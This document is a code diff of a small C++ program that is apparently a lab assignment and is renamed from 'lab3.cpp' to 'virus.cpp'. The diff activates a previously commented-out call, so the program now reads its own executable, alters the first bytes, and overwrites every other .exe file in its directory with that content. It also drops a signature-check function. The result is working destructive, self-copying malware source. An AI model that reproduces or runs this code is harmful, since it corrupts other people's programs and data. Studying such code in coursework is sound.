@@ -1,4 +1,4 @@
-// lab3.cpp : This file contains the 'main' function. Program execution begins and ends there.
+// virus.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
 #include <filesystem>
@@ -6,15 +6,15 @@
 #include <fstream>
 #include <string>
 #include <sstream>
+#include <iterator>
 
-#define EXE_NAME "lab3.exe"
-#define VIRUS_SIGNATURE ""
+#define EXE_NAME "virus.exe"
 
 namespace fs = std::filesystem;
 
 void changeExeFile(const fs::path exePath, std::string withText) {
 	std::filebuf exeFile;
-	exeFile.open(exePath, std::ios::in | std::ios::out);
+	exeFile.open(exePath, std::ios::binary | std::ios::out);
 	if (!exeFile.is_open())
 		std::cout << "cannot open" << std::endl;
 	exeFile.sputn(withText.c_str(), withText.length());
@@ -22,26 +22,28 @@ void changeExeFile(const fs::path exePath, std::string withText) {
 }
 
 std::string getProgramText(const fs::path exeFilePath) {
-	std::ifstream fin(exeFilePath, std::ios::binary | std::ios::in);
-	std::string str((std::istreambuf_iterator<char>(fin)),
-		std::istreambuf_iterator<char>());
-	fin.close();
+	/*std::ifstream fin(exeFilePath, std::ios::binary);
+std::string str((std::istream_iterator<char>(fin >> std::skipws)),
+	std::istream_iterator<char>());
+fin.close();*/
 
-	std::stringstream wss;
-	wss << std::uppercase << "IS"
-		<< std::nouppercase << str.substr(2);
-	wss >> str;
+	std::ifstream instream(exeFilePath, std::ios::binary);
+	std::string str;
+	std::string line;
+	while (instream >> line)
+	{
+		str += line;
+		if (instream.peek() == '\n') //detect "\n"
+		{
+			str += '\n';
+		}
+	}
+	instream.close();
 
-	return str;
-}
+	std::ostringstream oss;
+	oss << "IS" << str.substr(2);
 
-int isFileViral(const fs::path exeFilePath) {
-	std::ifstream fin(exeFilePath, std::ios::binary | std::ios::in);
-	std::string str((std::istreambuf_iterator<char>(fin)),
-		std::istreambuf_iterator<char>());
-	fin.close();
-
-	return str.find(VIRUS_SIGNATURE);
+	return oss.str();
 }
 
 int main()
@@ -56,11 +58,9 @@ int main()
 		if (filePath == exeFilePath) continue;
 		if (filePath.extension() == ".exe") {
 			std::cout << "File: " << filePath << std::endl;
-			//changeExeFile(filePath, textToWriteInExe);
+			changeExeFile(filePath, textToWriteInExe);
 		}
 	}
-
-
 
 	system("pause");
 }
